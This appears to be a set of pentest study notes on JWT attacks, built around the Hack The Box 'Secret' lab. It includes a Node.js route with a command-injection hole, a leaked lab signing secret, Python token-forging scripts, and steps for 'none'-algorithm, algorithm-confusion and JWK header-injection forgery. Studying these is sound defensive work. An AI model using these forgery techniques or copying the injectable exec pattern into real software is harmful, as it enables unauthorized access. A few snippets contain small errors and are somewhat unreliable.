---
description: >-
  Many applications use JSON Web Tokens (JWT) to allow the client to indicate
  its identity for further exchange after authentication.
cover: ../.gitbook/assets/shahadat-rahman-BfrQnKBulYQ-unsplash.jpg
coverY: 0
---

# JSON Web token

What is a JSON Web Token or JWT

JWTs are a secure, compact way to transmit information between parties. They're digitally signed, ensuring data integrity and authenticity. First what is JSON? JSON is a lightweight data interchange format that's easy to read and write.&#x20;

{% hint style="info" %}
Each section of a JSON webtoken is base64 encoded and seperated by a `'.'`  .
{% endhint %}

#### Header&#x20;

#### The header is made of the token type which is JWT and the algorithm used like HMAC, SHA256 or RSA.&#x20;

<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption><p>jwt header</p></figcaption></figure>

#### Payload&#x20;

Contain predefined claims which can be manipulated, they are statement about an entity which is usually the user. There are 3 types of claims: registered, public and private.

<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

#### Signature - Generated by hashing header and&#x20;

The first two parts: header and payloads wil not be encoded but not encrypted, anoyone can decode, read but also tamper with. The signatrue is created using the header, payload and the secret which is saved on the server. This is called signing the Json web token.

The signing alorithm takes the header, payload and secret to create a unique signature.&#x20;

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
If the two signatures which are being compared are actually different, it means that someone tampered with the data and authentication will fail.
{% endhint %}

### Forging a JWT for unauthorized acces

For this we are using the [Hackthebox Secret machine](https://www.hackthebox.com/machines/secret) . We find a .logs file with the following code which was vulnerable for command injection because it builds a string with user input and is then passed to exec. It starts at the const getLogs

```javascript
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

Creating a json token is done with the variables found in a login file

```javascript
router.post('/login', async (req , res) => {
<SNIP>
 // create jwt
 const token = jwt.sign({ _id: user.id, name: user.name , email: user.email},
process.env.TOKEN_SECRET )
 res.header('auth-token', token).send(token);
})
```

And with the secret in this: `gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE`

You can either craft it manually using burp or curl but http://jwt.io is a nice website for doing this. Changing the name to "theadmin"&#x20;

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Sending the request we get a response as admin, and simply by changing the name to theadmin user which had admin role we are now logged in as admin user.

<figure><img src="../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

For practice I wrote this simple python script which will take username and secret as input and then encode the new key.

{% code overflow="wrap" %}
```python
import jwt

def create_token(payload):
    secret = input('Secret: ')
    algorithm = 'HS256'
    
    # Uses jwt module to ecode jwt with payload, secret an alg.
    token = jwt.encode(payload, secret, algorithm=algorithm)
    return token

def json_payload():
    name = input('Name: ')

    # json token payload
    payload = {
        '_id': '67221de57376db047c259cc8', 
        'name': name, 
        'email': 'noreply@fake.com', 
        'iat': 1730289242
    }
    return payload

# Json function into variable payload 
payload = json_payload() 

# Call create_token function using payload function
print("\nAdmin token: ", create_token(payload))
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

### JWT None algorithm attack

We can use cyberchef and use JWT Sign with none algorithm. It could be the web app accpts a token without signature.&#x20;

<figure><img src="../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

### Algorithm Confusion

Here a different algorithm is used then the one that was used to make the token. For example when a token algorithm is RS256 a private and public key is used. We can use the public key to generate a token and change to algorithm to HS256.

```bash
# install rsa_sign2n
git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone/
docker build . -t sig2n

# Run 
docker run -it sig2n /bin/bash
```

Then insert 2 JWT's signed with same public key

```
python3 jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZsdfsfsmFsc2UsImV4cCI6MTcxMTI3MTkyOX0.<SNIP> eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsIsdfsdmV4cCI6MTcxMTI3MTk0Mn0.<SNIP>
```

Check for the pem file \*\_509.pem. Use that public key to create a new token in cyberchef.&#x20;

<figure><img src="../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

### JWK Exploit

When jwk is used its possible to forge a JWT using these details, by using script below, but first generate keys

```bash
openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
mczopenssl rsa -pubout -in private.pem -out public.pem
```

<details>

<summary>forgejwt_withjwk.py</summary>

```python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# JWT Payload
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

# convert PEM to JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm='RS256')
jwk_dict = jwk_key.to_dict()

# forge JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})

print(token)
```

</details>

